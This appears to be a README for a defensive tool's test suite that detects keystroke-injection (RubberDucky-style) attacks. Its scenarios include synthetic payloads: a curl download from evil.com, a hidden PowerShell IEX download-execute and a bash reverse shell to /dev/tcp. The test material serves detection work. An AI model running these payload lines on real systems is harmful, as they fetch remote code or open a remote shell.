# DuckHunt v2.0 - Test Suite

Comprehensive test suite for validating DuckHunt's behavioral analysis and attack detection capabilities.

---

## Test Structure

```
tests/
├── run_all_tests.py               # Test runner (runs all tests)
├── test_analyzer.py               # Unit tests for behavioral analyzer
├── test_detector.py               # Unit tests for pattern detector
├── test_profile_manager.py        # Unit tests for profile management
├── test_privacy.py                # Unit tests for privacy safeguards
├── test_integration.py            # End-to-end integration tests
└── synthetic_attacks/             # Synthetic attack payloads for testing
    ├── rubberducky_simple.txt     # Basic RubberDucky payload
    ├── rubberducky_powershell.txt # PowerShell download-execute attack
    ├── bash_bunny_linux.txt       # Linux reverse shell attack
    └── evasive_delayed.txt        # Evasive attack with human-like delays
```

---

## Running Tests

### Run All Tests

```bash
# From tests directory
python run_all_tests.py

# From project root
python -m pytest tests/

# Or use unittest
python -m unittest discover -s tests -p "test_*.py" -v
```

### Run Specific Test Module

```bash
# Analyzer tests only
python test_analyzer.py

# Detector tests only
python test_detector.py

# Privacy tests only
python test_privacy.py

# Integration tests only
python test_integration.py
```

### Run Specific Test Class or Method

```bash
# Specific test class
python -m unittest test_analyzer.TestBehavioralAnalyzer

# Specific test method
python -m unittest test_analyzer.TestBehavioralAnalyzer.test_fast_injection_detected
```

---

## Test Coverage

### Unit Tests

#### `test_analyzer.py` - Behavioral Analysis Engine
Tests the statistical analysis of keystroke timing patterns.

**Test Cases:**
- ✅ Normal typing detected as legitimate (low false positive rate)
- ✅ Fast injection detected (< 30ms intervals)
- ✅ Pattern matching for PowerShell/CMD sequences
- ✅ Zero error rate flagged as suspicious
- ✅ Digraph timing anomaly detection
- ✅ Hardware injection flag recognition
- ✅ Temporal consistency (unusual hours)
- ✅ Z-score calculation correctness
- ✅ IQR outlier detection
- ✅ Continuous learning updates profile

**Expected Results:**
- True Positive Rate: >95% (detect actual attacks)
- False Positive Rate: <0.5% (don't block normal typing)

---

#### `test_detector.py` - Pattern Matching Engine
Tests known attack pattern recognition.

**Test Cases:**
- ✅ Windows Run dialog (WIN+R) detection
- ✅ PowerShell execution pattern detection
- ✅ curl/wget download detection
- ✅ base64 decode detection
- ✅ Registry modification detection
- ✅ Repetition pattern detection (same key repeated)
- ✅ Alternating pattern detection
- ✅ Sequential pattern detection
- ✅ Normal typing not flagged
- ✅ GUI shortcut sequence detection
- ✅ Command injection character detection
- ✅ Empty/single keystroke handling
- ✅ Pattern confidence scoring
- ✅ Context-aware detection (window name affects risk)

**Expected Results:**
- Pattern match rate: >80% for known attack sequences
- False positive rate: <1% for normal text

---

#### `test_profile_manager.py` - Profile Management
Tests user behavioral profile storage and continuous learning.

**Test Cases:**
- ✅ Profile initialization
- ✅ Save and load profile persistence
- ✅ Speed distribution updates (exponential moving average)
- ✅ Digraph timing updates
- ✅ New digraph creation
- ✅ Error pattern tracking
- ✅ Learning phase progression (initial → continuous → stable)
- ✅ Learning rate application
- ✅ Profile export/import
- ✅ Profile validation
- ✅ Version compatibility
- ✅ Continuous learning toggle
- ✅ Temporal pattern updates
- ✅ Mouse characteristics tracking
- ✅ Profile reset
- ✅ Large sample count handling

**Expected Results:**
- Profile updates converge to stable mean/std dev
- Learning rate correctly applied (0.05 default)

---

#### `test_privacy.py` - Privacy Safeguards
Tests data minimization and privacy protection.

**Test Cases:**
- ✅ Content hashing (SHA256)
- ✅ Hash irreversibility
- ✅ Event sanitization (removes raw keystrokes)
- ✅ Window name categorization (BROWSER, EDITOR, TERMINAL, OTHER)
- ✅ Attack log sanitization
- ✅ Retention policy enforcement (auto-delete old logs)
- ✅ No plaintext passwords in logs
- ✅ Statistical data preservation
- ✅ Anonymization toggle
- ✅ Window name storage toggle
- ✅ Hash collision resistance
- ✅ Hash algorithm security (SHA256 only)
- ✅ Empty/null content handling
- ✅ Unicode content hashing
- ✅ Log format compliance (JSON)
- ✅ GDPR compliance (data minimization, no PII)
- ✅ Retention policy configurability

**Critical Tests:**
- ❌ Raw keystrokes NEVER stored
- ❌ Sensitive window titles NEVER logged
- ✅ Attack content always hashed

**Expected Results:**
- Zero raw keystroke storage
- All sensitive data hashed with SHA256
- Logs auto-deleted after retention period

---

### Integration Tests

#### `test_integration.py` - End-to-End Pipeline
Tests complete detection pipeline from event collection to enforcement.

**Test Cases:**
- ✅ Normal typing flows through without blocking
- ✅ Fast injection detected and blocked
- ✅ PowerShell attack detected
- ✅ Evasive attack with delays still detected
- ✅ Privacy layer integration
- ✅ Policy enforcement integration
- ✅ Continuous learning integration

**Test Scenarios:**
1. **Normal Typing**: "the quick brown fox"
   - Expected: <5% block rate
   - Tests: Statistical analysis, error patterns, natural variation

2. **Fast Injection**: "curl -o /tmp/payload http://evil.com/bad.sh"
   - Expected: >70% detection rate
   - Tests: Speed anomaly, pattern matching, zero errors

3. **PowerShell Attack**: "powershell -WindowStyle Hidden -Command ..."
   - Expected: >80% combined confidence
   - Tests: Multi-signal detection (speed + pattern + context)

4. **Evasive Attack**: Human-like delays but no errors
   - Expected: Detection via patterns and error rate
   - Tests: Robustness against evasion

---

### Synthetic Attack Payloads

#### `synthetic_attacks/rubberducky_simple.txt`
Basic RubberDucky payload testing core detection.

```
WIN+R → cmd → echo Malicious payload → exit
```

**Expected Detection:**
- Speed anomaly: ✅ (10-50ms intervals)
- Pattern match: ✅ (WIN+R, cmd, echo)
- Zero errors: ✅
- Confidence: >0.90

---

#### `synthetic_attacks/rubberducky_powershell.txt`
PowerShell download-execute attack.

```
WIN+R → powershell -WindowStyle Hidden -Command "IEX ..."
```

**Expected Detection:**
- Speed anomaly: ✅
- Pattern match: ✅ (powershell, IEX, DownloadString)
- Context: ✅ (Run dialog = high risk)
- Confidence: >0.95

---

#### `synthetic_attacks/bash_bunny_linux.txt`
Linux reverse shell establishment.

```
CTRL+ALT+T → bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Expected Detection:**
- Speed anomaly: ✅ (15ms intervals)
- Pattern match: ✅ (bash -i, /dev/tcp)
- Zero errors: ✅
- Confidence: >0.90

---

#### `synthetic_attacks/evasive_delayed.txt`
Evasive attack with intentional delays to bypass speed detection.

```
WIN+R → cmd → curl -o C:\temp\payload.exe http://evil.com/malware.exe
```

**Expected Detection:**
- Speed anomaly: ❌ (delays added)
- Pattern match: ✅ (cmd, curl, suspicious download)
- Zero errors: ✅ (no backspaces)
- No mouse movement: ✅
- Confidence: 0.70-0.85 (still detectable)

---

## Test Requirements

### Dependencies

```bash
# Core dependencies
pip install numpy scipy

# Testing dependencies
pip install pytest pytest-cov

# Platform-specific (for full integration tests)
# Windows: pywin32
# Linux: evdev
# macOS: pynput
```

### Test Data

- **Profile Templates**: `config/profile.template.json`
- **Configuration**: `config/duckhunt.v2.conf`
- **Synthetic Payloads**: `tests/synthetic_attacks/*.txt`

---

## Interpreting Results

### Success Criteria

**Unit Tests:**
- All core component tests must pass
- Privacy tests are CRITICAL (cannot fail)

**Integration Tests:**
- Normal typing block rate: <5%
- Attack detection rate: >70%
- False positive rate: <0.5%

**Performance:**
- Test execution time: <60 seconds total
- No memory leaks during tests

### Common Failures

**Test Failure: "Normal typing flagged as anomalous"**
- **Cause**: Profile not properly initialized or thresholds too strict
- **Fix**: Check profile initialization in setUp(), verify threshold values

**Test Failure: "Attack not detected"**
- **Cause**: Detection algorithm not sensitive enough or pattern library incomplete
- **Fix**: Review confidence threshold, add missing patterns

**Test Failure: "Raw keystroke found in sanitized event"**
- **Cause**: CRITICAL privacy violation
- **Fix**: Immediately fix sanitization logic, this must never happen

---

## Adding New Tests

### Template for New Unit Test

```python
import unittest
import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.your_module import YourClass


class TestYourClass(unittest.TestCase):
    """Test suite for YourClass"""

    def setUp(self):
        """Set up test fixtures"""
        self.instance = YourClass()

    def test_your_feature(self):
        """Test your feature description"""
        result = self.instance.your_method()
        self.assertEqual(result, expected_value)


if __name__ == '__main__':
    unittest.main()
```

### Template for New Integration Test

```python
def test_new_attack_scenario(self):
    """Test detection of [attack type]"""
    # 1. Create event sequence
    events = self._simulate_attack("attack payload")

    # 2. Run through pipeline
    for event in events:
        analysis_result = self.analyzer.analyze_keystroke(event)
        pattern_matches = self.detector.check_pattern_match(events[-10:])

    # 3. Verify detection
    self.assertGreater(analysis_result.confidence, 0.80)
```

---

## Continuous Integration

### GitHub Actions

```yaml
name: DuckHunt Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python-version: [3.8, 3.9, '3.10', 3.11]

    steps:
    - uses: actions/checkout@v2
    - name: Set up Python
      uses: actions/setup-python@v2
      with:
        python-version: ${{ matrix.python-version }}
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install pytest pytest-cov
    - name: Run tests
      run: |
        pytest tests/ -v --cov=core --cov-report=xml
    - name: Upload coverage
      uses: codecov/codecov-action@v2
```

---

## Troubleshooting

### ImportError: No module named 'core'

**Solution:**
```bash
# Run from project root, not tests directory
cd ..
python -m pytest tests/

# Or add parent to PYTHONPATH
export PYTHONPATH="${PYTHONPATH}:$(pwd)/.."
python tests/run_all_tests.py
```

### Tests fail with "Profile not found"

**Solution:**
Tests create temporary profiles in setUp(). Ensure tearDown() cleans up properly.

### Integration tests hang

**Solution:**
Check for infinite loops in analysis pipeline. Add timeout decorators if needed.

---

## Contributing

When adding new detection methods or features:

1. **Write tests first** (Test-Driven Development)
2. **Ensure privacy tests pass** (critical requirement)
3. **Add integration tests** for end-to-end validation
4. **Update this README** with new test documentation

---

## License

Tests are part of DuckHunt v2.0 and subject to the same license terms.

See [ETHICS.md](../ETHICS.md) for ethical usage guidelines.

---

**Last Updated:** January 2025
**Test Suite Version:** 2.0
